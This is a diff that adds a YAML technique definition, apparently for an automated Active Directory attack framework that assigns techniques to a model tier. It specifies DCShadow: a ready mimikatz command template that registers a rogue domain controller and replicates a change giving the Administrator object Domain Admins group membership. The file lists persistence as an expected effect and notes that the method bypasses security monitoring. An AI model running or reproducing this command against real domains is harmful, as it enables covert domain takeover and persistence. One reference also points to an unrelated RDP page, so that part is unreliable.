@@ -1,0 +1,36 @@
+name: dc_shadow
+category: ad
+description: DCShadow — register rogue DC and replicate arbitrary attribute changes
+preconditions:
+- domain_joined
+- has_cred
+- domain_admin
+parameters:
+  target_ip: from_engagement.target_ip
+  domain: from_engagement.domain
+command_template: mimikatz "lsadump::dcshadow /object:CN=Administrator,CN=Users,{domain_dn}
+  /attribute:primaryGroupID /value:512"
+parser: generic_parser
+expected_effects:
+- dc_shadow_active
+- domain_persistence
+- arbitrary_ad_change_via_replication
+falsifier:
+  pattern: ACCESS_DENIED|ERROR_DS_DRA|RPC failed|denied
+  timeout: 60
+model_tier: sonnet
+mechanism: 'Register a rogue DC to the domain temporarily (SPN + nTDSDSA object),
+  replicate
+
+  arbitrary attribute changes (sidHistory, ACE additions, GPO links) to legitimate
+  DCs.
+
+  The changes look like normal replication, bypassing security event monitoring tied
+
+  to direct LDAP modifications.
+
+  '
+references:
+  ocd_mindmap: 'Branch 13: DC Shadow'
+  hacktricks: windows-hardening/active-directory-methodology/dcshadow.md
+hacktricks_ref: network-services-pentesting/pentesting-rdp.md
